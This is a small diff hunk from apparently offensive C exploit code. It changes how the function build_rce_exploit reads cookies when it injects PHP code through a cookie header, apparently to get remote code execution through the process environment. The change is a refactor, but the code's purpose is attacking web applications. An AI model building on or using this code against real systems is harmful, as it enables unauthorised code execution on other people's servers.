@@ -101,8 +101,8 @@ void build_rce_exploit(CURL *curl, const char *base,
         break;
 
         case ENVIRON:
-            if(cookies){
-                cookieptr = cookie_append(cookies, phpcode);
+            if(global.cookies){
+                cookieptr = cookie_append(global.cookies, phpcode);
                 curl_easy_setopt(curl, CURLOPT_COOKIE, cookieptr);
                 free(cookieptr);
             } else {
